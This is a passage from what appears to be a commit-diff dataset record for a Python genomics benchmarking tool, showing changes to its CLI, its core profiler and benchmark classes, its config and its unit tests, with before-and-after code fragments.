an allele count as part of the benchmarking process.\n+benchmark_allele_count = True\n+\n+# Enables Principal Component Analysis (PCA) as part of the benchmarking process.\n+benchmark_PCA = False\n+\n [output]\n output_results = ~/benchmark/results.psv\ndiff --git a/requirements.txt b/requirements.txt\nindex 29a9eb2..f749f85 100644\n--- a/requirements.txt\n+++ b/requirements.txt\n@@ -1,3 +1,4 @@\n scikit-allel\n perf\n-numcodecs\n\\ No newline at end of file\n+numcodecs\n+pandas\n\\ No newline at end of file\ndiff --git a/tests/test_cli.py b/tests/test_cli.py\nindex 8a1f926..d221651 100644\n--- a/tests/test_cli.py\n+++ b/tests/test_cli.py\n@@ -32,9 +32,7 @@ def test_getting_command_arguments(self):\n         # Test group 2 -- setup\n         self.run_subparser_test(\"setup\",\"config_file\",\"./benhcmark.conf\")  \n         # Test group 3 - Tests if it the argparser is setting default values \"\"\"\n-        self.run_subparser_test(\"exec\",\"config_file\",\"./benchmark.conf\")  \n-        # Test group 4 - Tests if it the argparser is setting default values \"\"\"\n-        self.run_subparser_test(\"exec\",\"config_file\",\"./benchmark.conf\",\"label\",\"run\")    \n+        self.run_subparser_test(\"exec\",\"config_file\",\"./benchmark.conf\")\n \n \n     def test_parser_expected_failing(self):\ndiff --git a/tests/test_core.py b/tests/test_core.py\nindex 10e6159..1775eec 100644\n--- a/tests/test_core.py\n+++ b/tests/test_core.py\n@@ -1 +1,127 @@\n import unittest\n+from benchmark.core import *\n+from time import sleep\n+import os\n+\n+\n+class TestCoreBenchmark(unittest.TestCase):\n+    def test_benchmark_profiler_results(self):\n+        # Setup Benchmark Profiler object\n+        profiler_label = 'test_benchmark_profiler_results'\n+        profiler = BenchmarkProfiler(profiler_label)\n+\n+        # Run a few mock benchmarks\n+        benchmark_times = [1, 2, 10]\n+        i = 1\n+        for benchmark_time in benchmark_times:\n+            profiler.set_run_number(i)\n+\n+            operation_name = 'Sleep {} seconds'.format(benchmark_time)\n+\n+            # Run the mock benchmark, measuring time to run sleep command\n+            profiler.start_benchmark(operation_name)\n+            time.sleep(benchmark_time)\n+            profiler.end_benchmark()\n+\n+            # Grab benchmark results\n+            results = profiler.get_benchmark_results()\n+            results_exec_time = int(results.exec_time)  # Convert to int to truncate decimals\n+            results_operation_name = results.operation_name\n+            results_run_number = results.run_number\n+\n+            # Ensure benchmark results match expected values\n+            self.assertEqual(benchmark_time, results_exec_time, msg='Execution time is incorrect.')\n+            self.assertEqual(operation_name, results_operation_name, msg='Operation name is incorrect.')\n+            self.assertEqual(i, results_run_number, msg='Run number is incorrect.')\n+\n+            i += 1\n+\n+        # Delete *.psv file created when running benchmark\n+        psv_file = '{}.psv'.format(profiler_label)\n+        if os.path.exists(psv_file):\n+            os.remove(psv_file)\n+\n+    def test_benchmark_results_psv(self):\n+        # Setup Benchmark Profiler object\n+        profiler_label = 'test_benchmark_results_psv'\n+\n+        # Delete *.psv file created from any previous unit testing\n+        psv_file = '{}.psv'.format(profiler_label)\n+        if os.path.exists(psv_file):\n+            os.remove(psv_file)\n+\n+        profiler = BenchmarkProfiler(profiler_label)\n+\n+        operation_name_format = 'Sleep {} seconds'\n+\n+        # Run a few mock benchmarks\n+        benchmark_times = [1, 2, 10]\n+        i = 1\n+        for benchmark_time in benchmark_times:\n+            profiler.set_run_number(i)\n+\n+            operation_name = operation_name_format.format(benchmark_time)\n+\n+            # Run the mock benchmark, measuring time to run sleep command\n+            profiler.start_benchmark(operation_name)\n+            time.sleep(benchmark_time)\n+            profiler.end_benchmark()\n+\n+            i += 1\n+\n+        # Read results psv file\n+        psv_file = '{}.psv'.format(profiler_label)\n+\n+        # Ensure psv file was created\n+        if os.path.exists(psv_file):\n+            # Read file contents\n+            with open(psv_file, 'r') as f:\n+                psv_lines = [line.rstrip('\\n') for line in f]\n+\n+            # Check line count of psv file. Line count should be equal to number of benchmarks run + 1 (for header)\n+            num_lines = len(psv_lines)\n+            num_lines_expected = len(benchmark_times) + 1\n+            self.assertEqual(num_lines_expected, num_lines, msg='Line count in resulting psv file is incorrect.')\n+\n+            # Ensure header (first line) of psv file is correct\n+            header_expected = 'Log Timestamp|Run Number|Operation|Execution Time'\n+            header_actual = psv_lines[0]\n+            self.assertEqual(header_expected, header_actual)\n+\n+            # Ensure contents (benchmark data) of psv file is correct\n+            i = 1\n+            for line_number in range(1, num_lines):\n+                content = psv_lines[line_number].split('|')\n+\n+                # Ensure column count is correct\n+                num_columns = len(content)\n+                num_columns_expected = 4\n+                self.assertEqual(num_columns_expected, num_columns, msg='Column count for psv data is incorrect.')\n+\n+                # Ensure run number is correct\n+                run_number_psv = int(content[1])\n+                run_number_expected = i\n+                self.assertEqual(run_number_expected, run_number_psv, msg='Run number is incorrect.')\n+\n+                # Ensure operation name is correct\n+                operation_name_psv = content[2]\n+                operation_name_expected = operation_name_format.format(benchmark_times[i - 1])\n+                self.assertEqual(operation_name_expected, operation_name_psv, msg='Operation name is incorrect.')\n+\n+                # Ensure execution time is correct\n+                execution_time_psv = int(float(content[3]))  # Convert to int to truncate decimals\n+                execution_time_expected = benchmark_times[i - 1]\n+                self.assertEqual(execution_time_expected, execution_time_psv, msg='Execution time is incorrect')\n+\n+                i += 1\n+\n+        else:\n+            self.fail(msg='Resulting psv file could not be found.')\n+\n+        # Delete *.psv file created when running benchmark\n+        if os.path.exists(psv_file):\n+            os.remove(psv_file)\n+\n+\n+if __name__ == \"__main__\":\n+    unittest.main()\ndiff --git a/tests/test_data_service.py b/tests/test_data_service.py\nindex d69decb..f9004d1 100644\n--- a/tests/test_data_service.py\n+++ b/tests/test_data_service.py\n@@ -142,6 +142,7 @@ def test_convert_to_zarr(self):\n         if os.path.isfile(input_vcf_path):\n             # Setup test settings for Zarr conversion\n             vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation()\n+            vcf_to_zarr_config.fields = 'variants/numalt'\n             vcf_to_zarr_config.enabled = True\n             vcf_to_zarr_config.compressor = \"Blosc\"\n             vcf_to_zarr_config.blosc_compression_algorithm = \"zstd\"\n", "files": {"/benchmark/cli.py": {"changes": [{"diff": "\n runs the benchmarks, and records the timer results. \"\"\"\n \n import argparse  # for command line parsing\n+import datetime\n import time  # for benchmark timer\n import csv  # for writing results\n import logging\n import sys\n import shutil\n-from benchmark import config, data_service\n+from benchmark import core, config, data_service\n \n \n def get_cli_arguments():\n", "add": 2, "remove": 1, "filename": "/benchmark/cli.py", "badparts": ["from benchmark import config, data_service"], "goodparts": ["import datetime", "from benchmark import core, config, data_service"]}, {"diff": "\n \n     benchmark_exec_parser = subparser.add_parser(\"exec\",\n                                                  help='Execution of the benchmark modes. It requires a configuration file.')\n-    # TODO: use run_(timestamp) as default\n-    benchmark_exec_parser.add_argument(\"--label\", type=str, default=\"run\", metavar=\"RUN_LABEL\",\n+\n+    timestamp_current = datetime.datetime.fromtimestamp(time.time())\n+    benchmark_label_default = \"run_{timestamp}\".format(timestamp=timestamp_current.strftime(\"%Y-%m-%d_%H-%M-%S\"))\n+    benchmark_exec_parser.add_argument(\"--label\", type=str, default=benchmark_label_default, metavar=\"RUN_LABEL\",\n                                        help=\"Label for the benchmark run.\")\n     benchmark_exec_parser.add_argument(\"--config_file\", type=str, required=True,\n                                        help=\"Specify the path to a configuration file.\", metavar=\"FILEPATH\")\n", "add": 4, "remove": 2, "filename": "/benchmark/cli.py", "badparts": ["    benchmark_exec_parser.add_argument(\"--label\", type=str, default=\"run\", metavar=\"RUN_LABEL\","], "goodparts": ["    timestamp_current = datetime.datetime.fromtimestamp(time.time())", "    benchmark_label_default = \"run_{timestamp}\".format(timestamp=timestamp_current.strftime(\"%Y-%m-%d_%H-%M-%S\"))", "    benchmark_exec_parser.add_argument(\"--label\", type=str, default=benchmark_label_default, metavar=\"RUN_LABEL\","]}, {"diff": "\n \n \n def _main():\n-    input_directory = \"./data/input/\"\n-    download_directory = input_directory + \"download/\"\n-    temp_directory = \"./data/temp/\"\n-    vcf_directory = \"./data/vcf/\"\n-    zarr_directory_setup = \"./data/zarr/\"\n-    zarr_directory_benchmark = \"./data/zarr_benchmark/\"\n+    data_dirs = config.DataDirectoriesConfigurationRepresentation()\n \n     cli_arguments = get_cli_arguments()\n \n", "add": 1, "remove": 6, "filename": "/benchmark/cli.py", "badparts": ["    input_directory = \"./data/input/\"", "    download_directory = input_directory + \"download/\"", "    temp_directory = \"./data/temp/\"", "    vcf_directory = \"./data/vcf/\"", "    zarr_directory_setup = \"./data/zarr/\"", "    zarr_directory_benchmark = \"./data/zarr_benchmark/\""], "goodparts": ["    data_dirs = config.DataDirectoriesConfigurationRepresentation()"]}, {"diff": "\n         print(\"[Setup] Setting up benchmark data.\")\n \n         # Clear out existing files in VCF and Zarr directories\n-        data_service.remove_directory_tree(vcf_directory)\n-        data_service.remove_directory_tree(zarr_directory_setup)\n+        data_service.remove_directory_tree(data_dirs.vcf_dir)\n+        data_service.remove_directory_tree(data_dirs.zarr_dir_setup)\n \n         # Get runtime config from specified location\n         runtime_config = config.read_configuration(location=cli_arguments[\"config_file\"])\n", "add": 2, "remove": 2, "filename": "/benchmark/cli.py", "badparts": ["        data_service.remove_directory_tree(vcf_directory)", "        data_service.remove_directory_tree(zarr_directory_setup)"], "goodparts": ["        data_service.remove_directory_tree(data_dirs.vcf_dir)", "        data_service.remove_directory_tree(data_dirs.zarr_dir_setup)"]}, {"diff": "\n \n         if ftp_config.enabled:\n             print(\"[Setup][FTP] FTP module enabled. Running FTP download...\")\n-            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=download_directory)\n+            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=data_dirs.download_dir)\n         else:\n             print(\"[Setup][FTP] FTP module disabled. Skipping FTP download...\")\n \n         # Process/Organize downloaded files\n-        data_service.process_data_files(input_dir=input_directory,\n-                                        temp_dir=temp_directory,\n-                                        output_dir=vcf_directory)\n+        data_service.process_data_files(input_dir=data_dirs.input_dir,\n+                                        temp_dir=data_dirs.temp_dir,\n+                                        output_dir=data_dirs.vcf_dir)\n \n         # Convert VCF files to Zarr format if the module is enabled\n         vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)\n         if vcf_to_zarr_config.enabled:\n-            data_service.setup_vcf_to_zarr(input_vcf_dir=vcf_directory,\n-                                           output_zarr_dir=zarr_directory_setup,\n+            data_service.setup_vcf_to_zarr(input_vcf_dir=data_dirs.vcf_dir,\n+                                           output_zarr_dir=data_dirs.zarr_dir_setup,\n                                            conversion_config=vcf_to_zarr_config)\n     elif command == \"exec\":\n         print(\"[Exec] Executing benchmark tool.\")\n \n+        # Clear out existing files in Zarr benchmark directory\n+        data_service.remove_directory_tree(data_dirs.zarr_dir_benchmark)\n+\n         # Get runtime config from specified location\n         runtime_config = config.read_configuration(location=cli_arguments[\"config_file\"])\n \n-        # Get VCF to Zarr conversion settings from runtime config\n-        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)\n+        benchmark_label = cli_arguments[\"label\"]\n+\n+        # Get Benchmark module settings from runtime config\n+        benchmark_config = config.BenchmarkConfigurationRepresentation(runtime_config)\n+\n+        # Setup the benchmark runner\n+        benchmark = core.Benchmark(bench_conf=benchmark_config, data_dirs=data_dirs, benchmark_label=benchmark_label)\n \n-        # TODO: Convert necessary VCF files to Zarr format\n-        # data_service.convert_to_zarr(\"./data/vcf/chr22.1000.vcf\", \"./data/zarr/chr22.1000.zarr\", vcf_to_zarr_config)\n+        # Run the benchmark\n+        benchmark.run_benchmark()\n     else:\n         print(\"Error: Unexpected command specified. Exiting...\")\n         sys.exit(1)", "add": 18, "remove": 10, "filename": "/benchmark/cli.py", "badparts": ["            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=download_directory)", "        data_service.process_data_files(input_dir=input_directory,", "                                        temp_dir=temp_directory,", "                                        output_dir=vcf_directory)", "            data_service.setup_vcf_to_zarr(input_vcf_dir=vcf_directory,", "                                           output_zarr_dir=zarr_directory_setup,", "        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)"], "goodparts": ["            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=data_dirs.download_dir)", "        data_service.process_data_files(input_dir=data_dirs.input_dir,", "                                        temp_dir=data_dirs.temp_dir,", "                                        output_dir=data_dirs.vcf_dir)", "            data_service.setup_vcf_to_zarr(input_vcf_dir=data_dirs.vcf_dir,", "                                           output_zarr_dir=data_dirs.zarr_dir_setup,", "        data_service.remove_directory_tree(data_dirs.zarr_dir_benchmark)", "        benchmark_label = cli_arguments[\"label\"]", "        benchmark_config = config.BenchmarkConfigurationRepresentation(runtime_config)", "        benchmark = core.Benchmark(bench_conf=benchmark_config, data_dirs=data_dirs, benchmark_label=benchmark_label)", "        benchmark.run_benchmark()"]}], "source": "\n\"\"\" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, determines the runtime mode(dynamic vs. static); if dynamic, gets the benchmark data from the server, runs the benchmarks, and records the timer results. \"\"\" import argparse import time import csv import logging import sys import shutil from benchmark import config, data_service def get_cli_arguments(): \"\"\" Returns command line arguments. Returns: args object from an ArgumentParses for fetch data(boolean, from a server), label(optional, for naming the benchmark run), and config argument for where is the config file. \"\"\" logging.debug('Getting cli arguments') parser=argparse.ArgumentParser(description=\"A benchmark for genomics routines in Python.\") subparser=parser.add_subparsers(title=\"commands\", dest=\"command\") subparser.required=True config_parser=subparser.add_parser(\"config\", help='Setting up the default configuration of the benchmark. It creates the default configuration file.') config_parser.add_argument(\"--output_config\", type=str, required=True, help=\"Specify the output path to a configuration file.\", metavar=\"FILEPATH\") config_parser.add_argument(\"-f\", action=\"store_true\", help=\"Overwrite the destination file if it already exists.\") data_setup_parser=subparser.add_parser(\"setup\", help='Preparation and setting up of the data for the benchmark. It requires a configuration file.') data_setup_parser.add_argument(\"--config_file\", required=True, help=\"Location of the configuration file\", metavar=\"FILEPATH\") benchmark_exec_parser=subparser.add_parser(\"exec\", help='Execution of the benchmark modes. It requires a configuration file.') benchmark_exec_parser.add_argument(\"--label\", type=str, default=\"run\", metavar=\"RUN_LABEL\", help=\"Label for the benchmark run.\") benchmark_exec_parser.add_argument(\"--config_file\", type=str, required=True, help=\"Specify the path to a configuration file.\", metavar=\"FILEPATH\") runtime_configuration=vars(parser.parse_args()) return runtime_configuration def _main(): input_directory=\"./data/input/\" download_directory=input_directory +\"download/\" temp_directory=\"./data/temp/\" vcf_directory=\"./data/vcf/\" zarr_directory_setup=\"./data/zarr/\" zarr_directory_benchmark=\"./data/zarr_benchmark/\" cli_arguments=get_cli_arguments() command=cli_arguments[\"command\"] if command==\"config\": output_config_location=cli_arguments[\"output_config\"] overwrite_mode=cli_arguments[\"f\"] config.generate_default_config_file(output_location=output_config_location, overwrite=overwrite_mode) elif command==\"setup\": print(\"[Setup] Setting up benchmark data.\") data_service.remove_directory_tree(vcf_directory) data_service.remove_directory_tree(zarr_directory_setup) runtime_config=config.read_configuration(location=cli_arguments[\"config_file\"]) ftp_config=config.FTPConfigurationRepresentation(runtime_config) if ftp_config.enabled: print(\"[Setup][FTP] FTP module enabled. Running FTP download...\") data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=download_directory) else: print(\"[Setup][FTP] FTP module disabled. Skipping FTP download...\") data_service.process_data_files(input_dir=input_directory, temp_dir=temp_directory, output_dir=vcf_directory) vcf_to_zarr_config=config.VCFtoZarrConfigurationRepresentation(runtime_config) if vcf_to_zarr_config.enabled: data_service.setup_vcf_to_zarr(input_vcf_dir=vcf_directory, output_zarr_dir=zarr_directory_setup, conversion_config=vcf_to_zarr_config) elif command==\"exec\": print(\"[Exec] Executing benchmark tool.\") runtime_config=config.read_configuration(location=cli_arguments[\"config_file\"]) vcf_to_zarr_config=config.VCFtoZarrConfigurationRepresentation(runtime_config) else: print(\"Error: Unexpected command specified. Exiting...\") sys.exit(1) def main(): try: _main() except KeyboardInterrupt: print(\"Program interrupted. Exiting...\") sys.exit(1) ", "sourceWithComments": "\"\"\" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, \ndetermines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,\nruns the benchmarks, and records the timer results. \"\"\"\n\nimport argparse  # for command line parsing\nimport time  # for benchmark timer\nimport csv  # for writing results\nimport logging\nimport sys\nimport shutil\nfrom benchmark import config, data_service\n\n\ndef get_cli_arguments():\n    \"\"\" Returns command line arguments. \n\n    Returns:\n    args object from an ArgumentParses for fetch data (boolean, from a server), label (optional, for naming the benchmark run), \n    and config argument for where is the config file. \"\"\"\n\n    logging.debug('Getting cli arguments')\n\n    parser = argparse.ArgumentParser(description=\"A benchmark for genomics routines in Python.\")\n\n    # Enable three exclusive groups of options (using subparsers)\n    # https://stackoverflow.com/questions/17909294/python-argparse-mutual-exclusive-group/17909525\n\n    subparser = parser.add_subparsers(title=\"commands\", dest=\"command\")\n    subparser.required = True\n\n    config_parser = subparser.add_parser(\"config\",\n                                         help='Setting up the default configuration of the benchmark. It creates the default configuration file.')\n    config_parser.add_argument(\"--output_config\", type=str, required=True,\n                               help=\"Specify the output path to a configuration file.\", metavar=\"FILEPATH\")\n    config_parser.add_argument(\"-f\", action=\"store_true\", help=\"Overwrite the destination file if it already exists.\")\n\n    data_setup_parser = subparser.add_parser(\"setup\",\n                                             help='Preparation and setting up of the data for the benchmark. It requires a configuration file.')\n    data_setup_parser.add_argument(\"--config_file\", required=True, help=\"Location of the configuration file\",\n                                   metavar=\"FILEPATH\")\n\n    benchmark_exec_parser = subparser.add_parser(\"exec\",\n                                                 help='Execution of the benchmark modes. It requires a configuration file.')\n    # TODO: use run_(timestamp) as default\n    benchmark_exec_parser.add_argument(\"--label\", type=str, default=\"run\", metavar=\"RUN_LABEL\",\n                                       help=\"Label for the benchmark run.\")\n    benchmark_exec_parser.add_argument(\"--config_file\", type=str, required=True,\n                                       help=\"Specify the path to a configuration file.\", metavar=\"FILEPATH\")\n\n    runtime_configuration = vars(parser.parse_args())\n    return runtime_configuration\n\n\ndef _main():\n    input_directory = \"./data/input/\"\n    download_directory = input_directory + \"download/\"\n    temp_directory = \"./data/temp/\"\n    vcf_directory = \"./data/vcf/\"\n    zarr_directory_setup = \"./data/zarr/\"\n    zarr_directory_benchmark = \"./data/zarr_benchmark/\"\n\n    cli_arguments = get_cli_arguments()\n\n    command = cli_arguments[\"command\"]\n    if command == \"config\":\n        output_config_location = cli_arguments[\"output_config\"]\n        overwrite_mode = cli_arguments[\"f\"]\n        config.generate_default_config_file(output_location=output_config_location,\n                                            overwrite=overwrite_mode)\n    elif command == \"setup\":\n        print(\"[Setup] Setting up benchmark data.\")\n\n        # Clear out existing files in VCF and Zarr directories\n        data_service.remove_directory_tree(vcf_directory)\n        data_service.remove_directory_tree(zarr_directory_setup)\n\n        # Get runtime config from specified location\n        runtime_config = config.read_configuration(location=cli_arguments[\"config_file\"])\n\n        # Get FTP module settings from runtime config\n        ftp_config = config.FTPConfigurationRepresentation(runtime_config)\n\n        if ftp_config.enabled:\n            print(\"[Setup][FTP] FTP module enabled. Running FTP download...\")\n            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=download_directory)\n        else:\n            print(\"[Setup][FTP] FTP module disabled. Skipping FTP download...\")\n\n        # Process/Organize downloaded files\n        data_service.process_data_files(input_dir=input_directory,\n                                        temp_dir=temp_directory,\n                                        output_dir=vcf_directory)\n\n        # Convert VCF files to Zarr format if the module is enabled\n        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)\n        if vcf_to_zarr_config.enabled:\n            data_service.setup_vcf_to_zarr(input_vcf_dir=vcf_directory,\n                                           output_zarr_dir=zarr_directory_setup,\n                                           conversion_config=vcf_to_zarr_config)\n    elif command == \"exec\":\n        print(\"[Exec] Executing benchmark tool.\")\n\n        # Get runtime config from specified location\n        runtime_config = config.read_configuration(location=cli_arguments[\"config_file\"])\n\n        # Get VCF to Zarr conversion settings from runtime config\n        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)\n\n        # TODO: Convert necessary VCF files to Zarr format\n        # data_service.convert_to_zarr(\"./data/vcf/chr22.1000.vcf\", \"./data/zarr/chr22.1000.zarr\", vcf_to_zarr_config)\n    else:\n        print(\"Error: Unexpected command specified. Exiting...\")\n        sys.exit(1)\n\n\ndef main():\n    try:\n        _main()\n    except KeyboardInterrupt:\n        print(\"Program interrupted. Exiting...\")\n        sys.exit(1)\n"}, "/benchmark/core.py": {"changes": [{"diff": "\n determines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,\n runs the benchmarks, and records the timer results. \"\"\"\n \n+import allel\n+import zarr\n+import datetime\n import time  # for benchmark timer\n import csv  # for writing results\n import logging\n+import os\n+import pandas as pd\n+from collections import OrderedDict\n+from benchmark import config, data_service\n \n \n-def run_benchmark(bench_conf):\n-    pass\n+class BenchmarkResultsData:\n+    run_number = None\n+    operation_name = None\n+    start_time = None\n+    exec_time = None\n \n+    def to_dict(self):\n+        return OrderedDict([(\"Log Timestamp\", datetime.datetime.fromtimestamp(self.start_time)),\n+                            (\"Run Number\", self.run_number),\n+                            (\"Operation\", self.operation_name),\n+                            (\"Execution Time\", self.exec_time)])\n \n-def run_dynamic(ftp_location):\n-    pass\n+    def to_pandas(self):\n+        data = self.to_dict()\n+        df = pd.DataFrame(data, index=[1])\n+        df.index.name = '#'\n+        return df\n \n \n-def run_static():\n-    pass\n+class BenchmarkProfiler:\n+    benchmark_running = False\n \n+    def __init__(self, benchmark_label):\n+        self.results = BenchmarkResultsData()\n+        self.benchmark_label = benchmark_label\n \n-def get_remote_files(ftp_server, ftp_directory, files=None):\n-    pass\n+    def set_run_number(self, run_number):\n+        if not self.benchmark_running:\n+            self.results.run_number = run_number\n \n+    def start_benchmark(self, operation_name):\n+        if not self.benchmark_running:\n+            self.results.operation_name = operation_name\n \n-def record_runtime(benchmark, timestamp):\n-    pass\n+            self.benchmark_running = True\n \n+            # Start the benchmark timer\n+            self.results.start_time = time.time()\n \n-# temporary here\n-def main():\n-    pass\n+    def end_benchmark(self):\n+        if self.benchmark_running:\n+            end_time = time.time()\n+\n+            # Calculate the execution time from start and end times\n+            self.results.exec_time = end_time - self.results.start_time\n+\n+            # Save benchmark results\n+            self._record_runtime(self.results, \"{}.psv\".format(self.benchmark_label))\n+\n+            self.benchmark_running = False\n+\n+    def get_benchmark_results(self):\n+        return self.results\n+\n+    def _record_runtime(self, benchmark_results, output_filename):\n+        \"\"\"\n+        Records the benchmark results data entry to the specified PSV file.\n+        :param benchmark_results: BenchmarkResultsData object containing the benchmark results data\n+        :param output_filename: Which file to output the benchmark results to\n+        :type benchmark_results: BenchmarkResultsData\n+        :type output_filename: str\n+        \"\"\"\n+        output_filename = str(output_filename)\n+\n+        psv_header = not os.path.isfile(output_filename)\n+\n+        # Open the output file in append mode\n+        with open(output_filename, \"a\") as psv_file:\n+            pd_results = benchmark_results.to_pandas()\n+            pd_results.to_csv(psv_file, sep=\"|\", header=psv_header, index=False)\n+\n+\n+class Benchmark:\n+    benchmark_zarr_dir = \"\"  # Directory for which to use data from for benchmark process\n+    benchmark_zarr_file = \"\"  # File within benchmark_zarr_dir for which to use for benchmark process\n+\n+    def __init__(self, bench_conf, data_dirs, benchmark_label):\n+        \"\"\"\n+        Sets up a Benchmark object which is used to execute benchmarks.\n+        :param bench_conf: Benchmark configuration data that controls the benchmark execution\n+        :param data_dirs: DataDirectoriesConfigurationRepresentation object that contains working data directories\n+        :param benchmark_label: label to use when saving benchmark results to file\n+        :type bench_conf: config.BenchmarkConfigurationRepresentation\n+        :type data_dirs: config.DataDirectoriesConfigurationRepresentation\n+        :type benchmark_label: str\n+        \"\"\"\n+        self.bench_conf = bench_conf\n+        self.data_dirs = data_dirs\n+        self.benchmark_label = benchmark_label\n+\n+        self.benchmark_profiler = BenchmarkProfiler(benchmark_label=self.benchmark_label)\n+\n+    def run_benchmark(self):\n+        \"\"\"\n+        Executes the benchmarking process.\n+        \"\"\"\n+        if self.bench_conf is not None and self.data_dirs is not None:\n+            for run_number in range(1, self.bench_conf.benchmark_number_runs + 1):\n+                # Clear out existing files in Zarr benchmark directory\n+                # (Should be done every single run)\n+                data_service.remove_directory_tree(self.data_dirs.zarr_dir_benchmark)\n+\n+                # Update run number in benchmark profiler (for results tracking)\n+                self.benchmark_profiler.set_run_number(run_number)\n+\n+                # Prepare data directory and file locations for benchmarks\n+                if self.bench_conf.benchmark_data_input == \"vcf\":\n+                    self.benchmark_zarr_dir = self.data_dirs.zarr_dir_benchmark\n+\n+                    # Convert VCF data to Zarr format as part of benchmark\n+                    self._benchmark_convert_to_zarr()\n+\n+                elif self.bench_conf.benchmark_data_input == \"zarr\":\n+                    # Use pre-converted Zarr data which was done ahead of benchmark (i.e. in Setup mode)\n+                    self.benchmark_zarr_dir = self.data_dirs.zarr_dir_setup\n+                    self.benchmark_zarr_file = self.bench_conf.benchmark_dataset\n+\n+                else:\n+                    print(\"[Exec] Error: Invalid option supplied for benchmark data input format.\")\n+                    print(\"  - Expected data input formats: vcf, zarr\")\n+                    print(\"  - Provided data input format: {}\".format(self.bench_conf.benchmark_data_input))\n+                    exit(1)\n+\n+                # Ensure Zarr dataset exists and can be used for upcoming benchmarks\n+                benchmark_zarr_path = os.path.join(self.benchmark_zarr_dir, self.benchmark_zarr_file)\n+                if (benchmark_zarr_path != \"\") and (os.path.isdir(benchmark_zarr_path)):\n+                    # TODO: Run remaining benchmarks (e.g. loading into memory, allele counting, PCA, etc.)\n+                    pass\n+                else:\n+                    # Zarr dataset doesn't exist. Print error message and exit\n+                    print(\"[Exec] Error: Zarr dataset could not be found for benchmarking.\")\n+                    print(\"  - Zarr dataset location: {}\".format(benchmark_zarr_path))\n+\n+    def _benchmark_convert_to_zarr(self):\n+        self.benchmark_zarr_dir = self.data_dirs.zarr_dir_benchmark\n+        input_vcf_file = self.bench_conf.benchmark_dataset\n+        input_vcf_path = os.path.join(self.data_dirs.vcf_dir, input_vcf_file)\n+\n+        if os.path.isfile(input_vcf_path):\n+            output_zarr_file = input_vcf_file\n+            output_zarr_file = output_zarr_file[\n+                               0:len(output_zarr_file) - 4]  # Truncate *.vcf from input filename\n+            output_zarr_path = os.path.join(self.data_dirs.zarr_dir_benchmark, output_zarr_file)\n+\n+            data_service.convert_to_zarr(input_vcf_path=input_vcf_path,\n+                                         output_zarr_path=output_zarr_path,\n+                                         conversion_config=self.bench_conf.vcf_to_zarr_config,\n+                                         benchmark_runner=self.benchmark_profiler)\n+\n+            self.benchmark_zarr_file = output_zarr_file\n+        else:\n+            print(\"[Exec] Error: Dataset specified in configuration file does not exist. Exiting...\")\n+            print(\"  - Dataset file specified in configuration: {}\".format(input_vcf_file))\n+            print(\"  - Expected file location: {}\".format(input_vcf_path))\n+            exit(", "add": 152, "remove": 13, "filename": "/benchmark/core.py", "badparts": ["def run_benchmark(bench_conf):", "    pass", "def run_dynamic(ftp_location):", "    pass", "def run_static():", "    pass", "def get_remote_files(ftp_server, ftp_directory, files=None):", "    pass", "def record_runtime(benchmark, timestamp):", "    pass", "def main():", "    pass"], "goodparts": ["import allel", "import zarr", "import datetime", "import pandas as pd", "from collections import OrderedDict", "from benchmark import config, data_service", "class BenchmarkResultsData:", "    run_number = None", "    operation_name = None", "    start_time = None", "    exec_time = None", "    def to_dict(self):", "        return OrderedDict([(\"Log Timestamp\", datetime.datetime.fromtimestamp(self.start_time)),", "                            (\"Run Number\", self.run_number),", "                            (\"Operation\", self.operation_name),", "                            (\"Execution Time\", self.exec_time)])", "    def to_pandas(self):", "        data = self.to_dict()", "        df = pd.DataFrame(data, index=[1])", "        df.index.name = '#'", "        return df", "class BenchmarkProfiler:", "    benchmark_running = False", "    def __init__(self, benchmark_label):", "        self.results = BenchmarkResultsData()", "        self.benchmark_label = benchmark_label", "    def set_run_number(self, run_number):", "        if not self.benchmark_running:", "            self.results.run_number = run_number", "    def start_benchmark(self, operation_name):", "        if not self.benchmark_running:", "            self.results.operation_name = operation_name", "            self.benchmark_running = True", "            self.results.start_time = time.time()", "    def end_benchmark(self):", "        if self.benchmark_running:", "            end_time = time.time()", "            self.results.exec_time = end_time - self.results.start_time", "            self._record_runtime(self.results, \"{}.psv\".format(self.benchmark_label))", "            self.benchmark_running = False", "    def get_benchmark_results(self):", "        return self.results", "    def _record_runtime(self, benchmark_results, output_filename):", "        \"\"\"", "        Records the benchmark results data entry to the specified PSV file.", "        :param benchmark_results: BenchmarkResultsData object containing the benchmark results data", "        :param output_filename: Which file to output the benchmark results to", "        :type benchmark_results: BenchmarkResultsData", "        :type output_filename: str", "        \"\"\"", "        output_filename = str(output_filename)", "        psv_header = not os.path.isfile(output_filename)", "        with open(output_filename, \"a\") as psv_file:", "            pd_results = benchmark_results.to_pandas()", "            pd_results.to_csv(psv_file, sep=\"|\", header=psv_header, index=False)", "class Benchmark:", "    benchmark_zarr_dir = \"\"  # Directory for which to use data from for benchmark process", "    benchmark_zarr_file = \"\"  # File within benchmark_zarr_dir for which to use for benchmark process", "    def __init__(self, bench_conf, data_dirs, benchmark_label):", "        \"\"\"", "        Sets up a Benchmark object which is used to execute benchmarks.", "        :param bench_conf: Benchmark configuration data that controls the benchmark execution", "        :param data_dirs: DataDirectoriesConfigurationRepresentation object that contains working data directories", "        :param benchmark_label: label to use when saving benchmark results to file", "        :type bench_conf: config.BenchmarkConfigurationRepresentation", "        :type data_dirs: config.DataDirectoriesConfigurationRepresentation", "        :type benchmark_label: str", "        \"\"\"", "        self.bench_conf = bench_conf", "        self.data_dirs = data_dirs", "        self.benchmark_label = benchmark_label", "        self.benchmark_profiler = BenchmarkProfiler(benchmark_label=self.benchmark_label)", "    def run_benchmark(self):", "        \"\"\"", 